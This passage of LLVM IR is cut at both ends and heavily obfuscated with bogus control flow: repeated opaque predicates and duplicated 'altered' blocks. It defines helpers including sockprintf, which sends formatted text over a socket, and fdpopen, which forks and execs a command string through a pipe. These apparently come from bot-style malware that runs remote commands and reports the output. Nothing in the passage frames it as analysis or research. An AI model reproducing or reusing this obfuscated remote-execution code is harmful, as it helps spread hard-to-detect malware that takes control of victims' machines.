  br i1 %35, label %36, label %61

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %61

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %61

; <label>:42:                                     ; preds = %39
  %43 = load i32, i32* @x.11
  %44 = load i32, i32* @y.12
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  store i32 1, i32* %19, align 4
  %51 = load i32, i32* %10, align 4
  %52 = sub nsw i32 0, %51
  store i32 %52, i32* %21, align 4
  %53 = load i32, i32* @x.11
  %54 = load i32, i32* @y.12
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %61

; <label>:61:                                     ; preds = %originalBBpart2, %39, %36, %33
  %62 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %63 = getelementptr inbounds i8, i8* %62, i64 12
  %64 = getelementptr inbounds i8, i8* %63, i64 -1
  store i8* %64, i8** %17, align 8
  %65 = load i8*, i8** %17, align 8
  store i8 0, i8* %65, align 1
  br label %66

; <label>:66:                                     ; preds = %81, %61
  %67 = load i32, i32* %21, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %90

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* %21, align 4
  %71 = load i32, i32* %11, align 4
  %72 = urem i32 %70, %71
  store i32 %72, i32* %18, align 4
  %73 = load i32, i32* %18, align 4
  %74 = icmp sge i32 %73, 10
  br i1 %74, label %75, label %81

; <label>:75:                                     ; preds = %69
  %76 = load i32, i32* %15, align 4
  %77 = sub nsw i32 %76, 48
  %78 = sub nsw i32 %77, 10
  %79 = load i32, i32* %18, align 4
  %80 = add nsw i32 %79, %78
  store i32 %80, i32* %18, align 4
  br label %81

; <label>:81:                                     ; preds = %75, %69
  %82 = load i32, i32* %18, align 4
  %83 = add nsw i32 %82, 48
  %84 = trunc i32 %83 to i8
  %85 = load i8*, i8** %17, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 -1
  store i8* %86, i8** %17, align 8
  store i8 %84, i8* %86, align 1
  %87 = load i32, i32* %11, align 4
  %88 = load i32, i32* %21, align 4
  %89 = udiv i32 %88, %87
  store i32 %89, i32* %21, align 4
  br label %66

; <label>:90:                                     ; preds = %66
  %91 = load i32, i32* %19, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %126

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* @x.11
  %95 = load i32, i32* @y.12
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %93
  %102 = load i32, i32* %13, align 4
  %103 = icmp ne i32 %102, 0
  %104 = load i32, i32* @x.11
  %105 = load i32, i32* @y.12
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart25, label %originalBB3alteredBB

originalBBpart25:                                 ; preds = %originalBB3
  br i1 %103, label %112, label %122

; <label>:112:                                    ; preds = %originalBBpart25
  %113 = load i32, i32* %14, align 4
  %114 = and i32 %113, 2
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %116, label %122

; <label>:116:                                    ; preds = %112
  %117 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %117, i32 45)
  %118 = load i32, i32* %20, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %20, align 4
  %120 = load i32, i32* %13, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %13, align 4
  br label %125

; <label>:122:                                    ; preds = %112, %originalBBpart25
  %123 = load i8*, i8** %17, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 -1
  store i8* %124, i8** %17, align 8
  store i8 45, i8* %124, align 1
  br label %125

; <label>:125:                                    ; preds = %122, %116
  br label %126

; <label>:126:                                    ; preds = %125, %90
  %127 = load i32, i32* %20, align 4
  %128 = load i8**, i8*** %9, align 8
  %129 = load i8*, i8** %17, align 8
  %130 = load i32, i32* %13, align 4
  %131 = load i32, i32* %14, align 4
  %132 = call i32 @prints(i8** %128, i8* %129, i32 %130, i32 %131)
  %133 = add nsw i32 %127, %132
  store i32 %133, i32* %8, align 4
  br label %134

; <label>:134:                                    ; preds = %126, %25
  %135 = load i32, i32* @x.11
  %136 = load i32, i32* @y.12
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %134
  %143 = load i32, i32* %8, align 4
  %144 = load i32, i32* @x.11
  %145 = load i32, i32* @y.12
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  ret i32 %143

originalBBalteredBB:                              ; preds = %originalBB, %42
  store i32 1, i32* %19, align 4
  %152 = load i32, i32* %10, align 4
  %_ = sub i32 0, %152
  %gen = mul i32 %_, %152
  %_1 = shl i32 0, %152
  %_2 = shl i32 0, %152
  %153 = sub nsw i32 0, %152
  store i32 %153, i32* %21, align 4
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %93
  %154 = load i32, i32* %13, align 4
  %155 = icmp ne i32 %154, 0
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %134
  %156 = load i32, i32* %8, align 4
  br label %originalBB7
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.15
  %20 = load i32, i32* @y.16
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.17
  %4 = load i32, i32* @y.18
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #2
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i8*, i8** %14, align 8
  %32 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* %31)
  %33 = load i32, i32* %11, align 4
  %34 = load i8*, i8** %14, align 8
  %35 = load i8*, i8** %14, align 8
  %36 = call i64 @strlen(i8* %35) #10
  %37 = call i64 @send(i32 %33, i8* %34, i64 %36, i32 16384)
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %16, align 4
  %39 = load i8*, i8** %14, align 8
  call void @free(i8* %39) #2
  %40 = load i32, i32* %16, align 4
  %41 = load i32, i32* @x.17
  %42 = load i32, i32* @y.18
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %40

originalBBalteredBB:                              ; preds = %originalBB, %2
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i8*, align 8
  %53 = alloca [1 x %struct.__va_list_tag], align 16
  %54 = alloca i32, align 4
  store i32 %0, i32* %49, align 4
  store i8* %1, i8** %50, align 8
  %55 = call noalias i8* @malloc(i64 2048) #2
  store i8* %55, i8** %51, align 8
  %56 = load i8*, i8** %51, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 2048, i32 1, i1 false)
  %57 = load i8*, i8** %51, align 8
  store i8* %57, i8** %52, align 8
  %58 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %59 = bitcast %struct.__va_list_tag* %58 to i8*
  call void @llvm.va_start(i8* %59)
  %60 = load i8*, i8** %50, align 8
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %62 = call i32 @print(i8** %51, i8* %60, %struct.__va_list_tag* %61)
  %63 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %53, i32 0, i32 0
  %64 = bitcast %struct.__va_list_tag* %63 to i8*
  call void @llvm.va_end(i8* %64)
  %65 = load i8*, i8** %52, align 8
  %66 = load i8*, i8** %52, align 8
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  store i8 10, i8* %68, align 1
  %69 = load i8*, i8** %52, align 8
  %70 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* %69)
  %71 = load i32, i32* %49, align 4
  %72 = load i8*, i8** %52, align 8
  %73 = load i8*, i8** %52, align 8
  %74 = call i64 @strlen(i8* %73) #10
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* %54, align 4
  %77 = load i8*, i8** %52, align 8
  call void @free(i8* %77) #2
  %78 = load i32, i32* %54, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:26:                                     ; preds = %19
  %27 = load i32, i32* @x.19
  %28 = load i32, i32* @y.20
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %36 = call i32 @pipe(i32* %35) #2
  %37 = icmp slt i32 %36, 0
  %38 = load i32, i32* @x.19
  %39 = load i32, i32* @y.20
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %46, label %47

; <label>:46:                                     ; preds = %originalBBpart2
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.19
  %49 = load i32, i32* @y.20
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = icmp eq i32* %56, null
  %58 = load i32, i32* @x.19
  %59 = load i32, i32* @y.20
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %66, label %86

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = call i32 @getdtablesize() #2
  store i32 %67, i32* %8, align 4
  %68 = icmp sle i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %66
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = mul i64 %72, 4
  %74 = trunc i64 %73 to i32
  %75 = zext i32 %74 to i64
  %76 = call noalias i8* @malloc(i64 %75) #2
  %77 = bitcast i8* %76 to i32*
  store i32* %77, i32** @fdopen_pids, align 8
  %78 = icmp eq i32* %77, null
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %70
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:80:                                     ; preds = %70
  %81 = load i32*, i32** @fdopen_pids, align 8
  %82 = bitcast i32* %81 to i8*
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = mul i64 %84, 4
  call void @llvm.memset.p0i8.i64(i8* %82, i8 0, i64 %85, i32 1, i1 false)
  br label %86

; <label>:86:                                     ; preds = %80, %originalBBpart24
  %87 = call i32 @vfork() #11
  store i32 %87, i32* %9, align 4
  switch i32 %87, label %197 [
    i32 -1, label %88
    i32 0, label %111
  ]

; <label>:88:                                     ; preds = %86
  %89 = load i32, i32* @x.19
  %90 = load i32, i32* @y.20
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %98 = load i32, i32* %97, align 4
  %99 = call i32 @close(i32 %98)
  %100 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @close(i32 %101)
  store i32 -1, i32* %3, align 4
  %103 = load i32, i32* @x.19
  %104 = load i32, i32* @y.20
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %253

; <label>:111:                                    ; preds = %86
  %112 = load i8*, i8** %5, align 8
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 114
  br i1 %115, label %116, label %147

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* @x.19
  %118 = load i32, i32* @y.20
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %116
  %125 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %126 = load i32, i32* %125, align 4
  %127 = icmp ne i32 %126, 1
  %128 = load i32, i32* @x.19
  %129 = load i32, i32* @y.20
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %127, label %136, label %143

; <label>:136:                                    ; preds = %originalBBpart212
  %137 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @dup2(i32 %138, i32 1) #2
  %140 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @close(i32 %141)
  br label %143

; <label>:143:                                    ; preds = %136, %originalBBpart212
  %144 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %145 = load i32, i32* %144, align 4
  %146 = call i32 @close(i32 %145)
  br label %178

; <label>:147:                                    ; preds = %111
  %148 = load i32, i32* @x.19
  %149 = load i32, i32* @y.20
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %147
  %156 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %157 = load i32, i32* %156, align 4
  %158 = icmp ne i32 %157, 0
  %159 = load i32, i32* @x.19
  %160 = load i32, i32* @y.20
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %158, label %167, label %174

; <label>:167:                                    ; preds = %originalBBpart216
  %168 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %169 = load i32, i32* %168, align 4
  %170 = call i32 @dup2(i32 %169, i32 0) #2
  %171 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %172 = load i32, i32* %171, align 4
  %173 = call i32 @close(i32 %172)
  br label %174

; <label>:174:                                    ; preds = %167, %originalBBpart216
  %175 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %176 = load i32, i32* %175, align 4
  %177 = call i32 @close(i32 %176)
  br label %178

; <label>:178:                                    ; preds = %174, %143
  %179 = load i32, i32* @x.19
  %180 = load i32, i32* @y.20
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %178
  %187 = load i8*, i8** %4, align 8
  %188 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.68, i32 0, i32 0), i8* %187, i8* null) #2
  call void @_exit(i32 127) #12
  %189 = load i32, i32* @x.19
  %190 = load i32, i32* @y.20
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  unreachable

; <label>:197:                                    ; preds = %86
  %198 = load i32, i32* @x.19
  %199 = load i32, i32* @y.20
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %197
  %206 = load i8*, i8** %5, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 114
  %210 = load i32, i32* @x.19
  %211 = load i32, i32* @y.20
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %209, label %218, label %240

; <label>:218:                                    ; preds = %originalBBpart224
  %219 = load i32, i32* @x.19
  %220 = load i32, i32* @y.20
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %218
  %227 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %228 = load i32, i32* %227, align 4
  store i32 %228, i32* %6, align 4
  %229 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %230 = load i32, i32* %229, align 4
  %231 = call i32 @close(i32 %230)
  %232 = load i32, i32* @x.19
  %233 = load i32, i32* @y.20
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %246

; <label>:240:                                    ; preds = %originalBBpart224
  %241 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %242 = load i32, i32* %241, align 4
  store i32 %242, i32* %6, align 4
  %243 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %244 = load i32, i32* %243, align 4
  %245 = call i32 @close(i32 %244)
  br label %246

; <label>:246:                                    ; preds = %240, %originalBBpart228
  %247 = load i32, i32* %9, align 4
  %248 = load i32*, i32** @fdopen_pids, align 8
  %249 = load i32, i32* %6, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i32, i32* %248, i64 %250
  store i32 %247, i32* %251, align 4
  %252 = load i32, i32* %6, align 4
  store i32 %252, i32* %3, align 4
  br label %253

; <label>:253:                                    ; preds = %246, %originalBBpart28, %79, %69, %46, %25
  %254 = load i32, i32* %3, align 4
  ret i32 %254

originalBBalteredBB:                              ; preds = %originalBB, %26
  %255 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %256 = call i32 @pipe(i32* %255) #2
  %257 = icmp slt i32 %256, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %258 = load i32*, i32** @fdopen_pids, align 8
  %259 = icmp eq i32* %258, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %260 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %261 = load i32, i32* %260, align 4
  %262 = call i32 @close(i32 %261)
  %263 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %264 = load i32, i32* %263, align 4
  %265 = call i32 @close(i32 %264)
  store i32 -1, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %116
  %266 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %267 = load i32, i32* %266, align 4
  %268 = icmp ne i32 %267, 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %147
  %269 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %270 = load i32, i32* %269, align 4
  %271 = icmp ne i32 %270, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %178
